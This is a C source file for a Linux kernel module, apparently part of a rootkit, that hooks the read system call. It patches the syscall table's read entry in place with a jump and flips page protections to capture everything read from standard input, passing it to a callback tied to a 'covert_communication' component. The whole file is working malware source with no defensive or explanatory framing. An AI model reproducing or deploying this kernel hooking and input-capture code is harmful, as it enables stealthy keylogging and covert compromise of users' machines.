#include "global.h"
#include "sysmap.h"
#include "hook_read.h"
#include <linux/unistd.h>

#include "covert_communication.h"

typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
static fun_ssize_t_int_pvoid_size_t original_read;

#define SYSCALL_NR __NR_read

#define SYSCALL_CODE_LENGTH 5

static char syscall_code[SYSCALL_CODE_LENGTH];
static char new_syscall_code[SYSCALL_CODE_LENGTH] =
  "\xe9\x00\x00\x00\x00"  /*      jmp   $0  */
;
// static char new_syscall_code[7] =
//   "\xbd\x00\x00\x00\x00"  /*      movl   $0,%ebp  */
//   "\xff\xe5"              /*      jmp    *%ebp    */
// ;

#define NUM_BYTES_FOR_HOOKED_READ 40

char read_original_bytes[NUM_BYTES_FOR_HOOKED_READ];

static fun_void_charp_int callback_function;

static asmlinkage ssize_t internal_hooked_read(unsigned int fd, char __user *buf, size_t count);

static asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;
    retval = internal_hooked_read(fd, buf, count);
    printk(KERN_INFO "Hooked read: %d\n", retval);
    return retval;
}

void *_memcpy(void *dest, const void *src, int size, int correctrights){
    const char *p = src;
    char *q = dest;
    int i;
    for (i = 0; i < size; i++){
        if (correctrights){
            make_page_writable((long unsigned int) q);
        }
        *q++ = *p++;
        if (correctrights){
            make_page_readonly((long unsigned int) q);
        }
    }
    return dest;
}

asmlinkage ssize_t new_syscall(unsigned int fd, char __user *buf, size_t count){
    void** sys_call_table = (void *) ptr_sys_call_table;
    ssize_t retval;
    OUR_TRY_MODULE_GET;
    printk(KERN_INFO "This is the hooked read!\n");
    _memcpy(
            sys_call_table[SYSCALL_NR], syscall_code,
            sizeof(syscall_code), 1
           );

    retval = ((asmlinkage ssize_t (*)(unsigned int, char __user*, size_t))sys_call_table[SYSCALL_NR])(fd, buf, count);

    if (retval > 0 && fd == 0){ // only handle this when we actually read something and only read from stdin (fd==0)
        printk("Well, I got something from stdin.\n");
        handle_input(buf, retval);
    }

    _memcpy(
            sys_call_table[SYSCALL_NR], new_syscall_code,
            sizeof(syscall_code), 1
           );

    OUR_MODULE_PUT;
    return retval;
}

static asmlinkage ssize_t internal_hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;

    OUR_TRY_MODULE_GET;
    retval = original_read(fd, buf, count);

    if (retval > 0 && fd == 0){ // only handle this when we actually read something and only read from stdin (fd==0)
        callback_function(buf, retval);
        //printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
    }
    OUR_MODULE_PUT;
    return retval;
}

static void dummy_callback(char* buf, int size){
    OUR_DEBUG("unhandled input from stdin (no callback registered): %s", buf);
    //call this when no callback is specified
}

void save_original_read(void){
    int i;
    void** sys_call_table = (void *) ptr_sys_call_table;
    char* bytes = (char*)sys_call_table[__NR_read];
    char* newbytes = (char*)hooked_read;
    make_page_writable((long unsigned int) (((void**)ptr_sys_call_table)[__NR_read]));
    for (i=0; i<NUM_BYTES_FOR_HOOKED_READ; ++i){
        read_original_bytes[i] = bytes[i];
        bytes[i] = newbytes[i];
    }
    make_page_readonly((long unsigned int) (((void**)ptr_sys_call_table)[__NR_read]));
}

void restore_original_read(void){
    int i;
    void** sys_call_table = (void *) ptr_sys_call_table;
    char* bytes = (char*)sys_call_table[__NR_read];
    make_page_writable((long unsigned int) (((void**)ptr_sys_call_table)[__NR_read]));
    for (i=0; i<NUM_BYTES_FOR_HOOKED_READ; ++i){
        bytes[i] = read_original_bytes[i];
    }
    make_page_readonly((long unsigned int) (((void**)ptr_sys_call_table)[__NR_read]));
}

/* Hooks the read system call. */
void hook_read(fun_void_charp_int cb){
    void** sys_call_table = (void *) ptr_sys_call_table;
    // int i;
    if(cb == 0){
        callback_function = dummy_callback;
    } else {
        callback_function = cb;
    }

    *(int *)&new_syscall_code[1] = ((int)new_syscall) - ((int)sys_call_table[SYSCALL_NR] + 5);

    
    _memcpy( syscall_code, sys_call_table[SYSCALL_NR], sizeof(syscall_code), 0);
    _memcpy( sys_call_table[SYSCALL_NR], new_syscall_code, sizeof(syscall_code), 1);

    // save_original_read();

    // original_read = sys_call_table[__NR_read];
    // make_page_writable((long unsigned int) ptr_sys_call_table);
    // sys_call_table[__NR_read] = (void*) hooked_read;
    // make_page_readonly((long unsigned int) ptr_sys_call_table);
}

/* Hooks the read system call. */
void unhook_read(void){
    void** sys_call_table = (void*) ptr_sys_call_table;
    //OUR_DEBUG("Unhooking read...\n");
    callback_function = dummy_callback;

    _memcpy( sys_call_table[SYSCALL_NR], syscall_code, sizeof(syscall_code), 1);

    //restore_original_read();

    // sys_call_table = (void *) ptr_sys_call_table;
    // make_page_writable((long unsigned int) ptr_sys_call_table);
    // sys_call_table[__NR_read] = (void*) original_read;
    // make_page_readonly((long unsigned int) ptr_sys_call_table);
}
